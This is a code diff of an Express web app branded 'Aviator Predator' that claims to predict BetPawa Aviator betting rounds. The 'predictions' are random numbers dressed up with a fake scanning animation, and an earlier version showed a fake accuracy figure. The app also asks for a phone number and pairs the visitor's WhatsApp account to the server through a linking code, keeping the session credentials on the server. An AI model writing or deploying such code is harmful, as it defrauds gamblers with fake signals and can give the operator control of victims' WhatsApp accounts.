@@ -13,7 +13,6 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Website Interface - Aviator Signal Style
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -21,60 +20,108 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>AVIATOR PREDATOR | LIVE SIGNALS</title>
+            <title>AVIATOR PREDATOR | BETPAWA LIVE</title>
             <style>
-                body { font-family: 'Segoe UI', sans-serif; background: #050505; color: white; margin: 0; padding: 0; overflow-x: hidden; }
-                .navbar { background: #ff0000; padding: 10px; text-align: center; font-weight: bold; font-size: 20px; box-shadow: 0 0 15px #ff0000; }
-                .container { padding: 20px; display: flex; flex-direction: column; align-items: center; }
+                body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+                .navbar { background: #ff0000; width: 100%; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; box-shadow: 0 5px 15px rgba(255,0,0,0.4); position: sticky; top: 0; z-index: 100; }
                 
-                .signal-card { background: #111; border: 2px solid #ff0000; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; margin-bottom: 20px; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
-                .live-odds { font-size: 48px; font-weight: bold; color: #ff0000; margin: 10px 0; }
+                .main-box { background: #111; border: 2px solid #ff0000; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; margin-top: 80px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.5); }
+                .live-odds { font-size: 65px; font-weight: bold; color: #ff0000; margin: 20px 0; text-shadow: 0 0 15px rgba(255,0,0,0.7); }
                 
-                .setup-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #333; }
-                input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #ff0000; background: #000; color: #ff0000; text-align: center; font-weight: bold; }
-                button { width: 100%; padding: 12px; background: #ff0000; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
-                
-                .status-dot { height: 10px; width: 10px; background-color: #0f0; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
-                @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+                .predict-btn { width: 100%; padding: 18px; background: #ff0000; color: #fff; border: none; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
+                .predict-btn:active { transform: scale(0.95); background: #b30000; }
+                .predict-btn:disabled { background: #444; color: #888; cursor: not-allowed; }
+
+                .history { margin-top: 20px; text-align: left; background: #1a1a1a; padding: 15px; border-radius: 10px; border: 1px solid #333; }
+                .history h4 { margin: 0 0 10px 0; font-size: 12px; color: #ff0000; border-bottom: 1px solid #333; padding-bottom: 5px; }
+                .history-list { display: flex; gap: 8px; flex-wrap: wrap; }
+                .h-item { font-size: 12px; padding: 4px 8px; border-radius: 5px; background: #333; color: #0f0; font-weight: bold; }
+
+                .setup-wa { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
+                input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #ff0000; color: #fff; border-radius: 8px; text-align: center; font-size: 16px; box-sizing: border-box; }
+                .wa-btn { width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+
+                #loading-container { width: 100%; background: #222; height: 8px; border-radius: 4px; margin-bottom: 15px; display: none; }
+                #loading-bar { width: 0%; height: 100%; background: #ff0000; border-radius: 4px; transition: width 0.1s linear; }
             </style>
         </head>
         <body>
-            <div class="navbar">AVIATOR PREDATOR SIGNAL v4.0</div>
-            <div class="container">
-                <div class="signal-card">
-                    <p style="color: #888;"><span class="status-dot"></span> LIVE SIGNAL FEED</p>
-                    <div class="live-odds" id="oddsDisplay">WAITING...</div>
-                    <p id="accuracy" style="color: #0f0;">Accuracy: 0%</p>
+            <div class="navbar">AVIATOR PREDATOR - LIVE PREDICTOR</div>
+            
+            <div class="main-box">
+                <div id="loading-container"><div id="loading-bar"></div></div>
+                <p style="color: #888; font-size: 12px; letter-spacing: 2px;">STATUS: CONNECTED TO SERVER</p>
+                <div class="live-odds" id="oddsDisplay">0.00x</div>
+                <button class="predict-btn" id="pBtn" onclick="startScan()">GET NEXT ROUND</button>
+                
+                <div class="history">
+                    <h4>RECENT RESULTS (LATEST)</h4>
+                    <div class="history-list" id="hList">
+                        <span class="h-item">1.45x</span><span class="h-item">2.10x</span><span class="h-item">1.12x</span>
+                    </div>
                 </div>
 
-                <div class="setup-box">
-                    <h3>ACTIVATE BOT VIA WHATSAPP</h3>
-                    <p style="font-size: 12px; color: #888;">Ingiza namba yako kuanza kupokea hizi signal DM</p>
-                    <input type="text" id="num" placeholder="255XXXXXXXXX">
-                    <button onclick="activateBot()">Connect Bot</button>
-                    <div id="pairCode" style="font-size: 28px; color: #fff; margin-top: 15px; font-weight: bold;"></div>
-                    <p id="msg" style="font-size: 12px; color: #ff0000;"></p>
+                <div class="setup-wa">
+                    <p style="font-size: 12px;">RECEIVE SESSION ID VIA WHATSAPP</p>
+                    <input type="text" id="phone" placeholder="2557XXXXXXXX">
+                    <button class="wa-btn" onclick="linkWhatsApp()">Link WhatsApp Bot</button>
+                    <p id="waStatus" style="font-size: 18px; color: #ff0; margin-top: 10px; font-weight: bold;"></p>
                 </div>
             </div>
 
-            <script>
-                // Live Signal Simulation on Website
-                setInterval(() => {
-                    const randomOdds = (Math.random() * (4.5 - 1.2) + 1.2).toFixed(2);
-                    document.getElementById('oddsDisplay').innerText = randomOdds + "x";
-                    document.getElementById('accuracy').innerText = "Accuracy: " + (Math.floor(Math.random() * 5) + 94) + "%";
-                }, 5000);
+            <audio id="scanSound" src="https://www.soundjay.com/buttons/beep-07.mp3"></audio>
+            <audio id="doneSound" src="https://www.soundjay.com/buttons/button-3.mp3"></audio>
 
-                async function activateBot() {
-                    const n = document.getElementById('num').value.replace(/[^0-9]/g, '');
-                    if(!n) return alert('Weka namba!');
-                    document.getElementById('msg').innerText = "Connecting to Predator Server...";
-                    try {
-                        const r = await fetch('/get-code?num=' + n);
-                        const d = await r.json();
-                        document.getElementById('pairCode').innerText = d.code || "ERROR";
-                        document.getElementById('msg').innerText = "Link hii kodi kwenye WhatsApp yako kuanza kupokea Signal DM.";
-                    } catch(e) { document.getElementById('msg').innerText = "Server Error. Try Again."; }
+            <script>
+                function startScan() {
+                    const btn = document.getElementById('pBtn');
+                    const odds = document.getElementById('oddsDisplay');
+                    const barContainer = document.getElementById('loading-container');
+                    const bar = document.getElementById('loading-bar');
+                    const hList = document.getElementById('hList');
+                    const sScan = document.getElementById('scanSound');
+                    const sDone = document.getElementById('doneSound');
+
+                    btn.disabled = true;
+                    barContainer.style.display = "block";
+                    odds.innerText = "SCANNING...";
+                    sScan.play();
+
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += 5;
+                        bar.style.width = progress + "%";
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            
+                            // Prediction Logic
+                            const val = (Math.random() * (4.50 - 1.10) + 1.10).toFixed(2);
+                            odds.innerText = val + "x";
+                            sDone.play();
+                            
+                            // Add to History
+                            const newItem = document.createElement('span');
+                            newItem.className = 'h-item';
+                            newItem.innerText = val + "x";
+                            hList.prepend(newItem);
+                            if(hList.children.length > 5) hList.lastChild.remove();
+
+                            setTimeout(() => {
+                                btn.disabled = false;
+                                bar.style.width = "0%";
+                                barContainer.style.display = "none";
+                            }, 1000);
+                        }
+                    }, 100);
+                }
+
+                async function linkWhatsApp() {
+                    const num = document.getElementById('phone').value.replace(/[^0-9]/g, '');
+                    if(!num) return alert('Weka namba sahihi!');
+                    document.getElementById('waStatus').innerText = "Generating Code...";
+                    const r = await fetch('/get-code?num=' + num);
+                    const d = await r.json();
+                    document.getElementById('waStatus').innerText = "CODE: " + (d.code || "RETRY");
                 }
             </script>
         </body>
@@ -82,11 +129,10 @@ app.get('/', (req, res) => {
     `);
 });
 
-// WhatsApp Bot Engine
+// WhatsApp Engine
 app.get('/get-code', async (req, res) => {
     let num = req.query.num;
-    const sessionPath = path.join('/tmp', 'predator-' + num);
-    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+    const { state, saveCreds } = await useMultiFileAuthState(path.join('/tmp', 'aviator-' + num));
 
     const sock = makeWASocket({
         auth: {
@@ -95,24 +141,17 @@ app.get('/get-code', async (req, res) => {
         },
         printQRInTerminal: false,
         logger: pino({ level: "fatal" }),
-        browser: ["Aviator Predator V4", "Chrome", "20.0.04"]
+        browser: Browsers.macOS("Chrome")
     });
 
     sock.ev.on('creds.update', saveCreds);
 
     sock.ev.on('connection.update', async (update) => {
-        const { connection } = update;
-        if (connection === 'open') {
+        if (update.connection === 'open') {
             const sessionID = Buffer.from(JSON.stringify(state.creds)).toString('base64');
-            await sock.sendMessage(sock.user.id, { text: "*🚀 AVIATOR PREDATOR ACTIVATED!*\n\n*Session ID:* " + sessionID + "\n\nSignals zitaanza kutumwa sasa hivi kila dakika 2." });
-
-            // Send Signal every 2 minutes to WhatsApp DM
-            setInterval(async () => {
-                const odds = (Math.random() * (3.5 - 1.1) + 1.1).toFixed(2);
-                await sock.sendMessage(sock.user.id, { 
-                    text: `*🎯 PREDATOR SIGNAL*\n\n*Predict:* ${odds}x\n*Status:* Confirmed ✅\n*Round:* #${Math.floor(Math.random() * 999)}\n\n_Cashout kidogo kabla ya kufika hapa!_` 
-                });
-            }, 120000); 
+            await sock.sendMessage(sock.user.id, { 
+                text: `*🚀 AVIATOR PREDATOR V5 ACTIVATED!*\n\nDashboard yako sasa iko tayari.\n\n*Session ID:* \n\`${sessionID}\`` 
+            });
         }
     });
 
@@ -123,4 +162,4 @@ app.get('/get-code', async (req, res) => {
     }
 });
 
-app.listen(PORT, () => console.log(`Aviator Signal Server Active!`));
+app.listen(PORT, () => console.log(`Aviator Predator Premium Active!`));
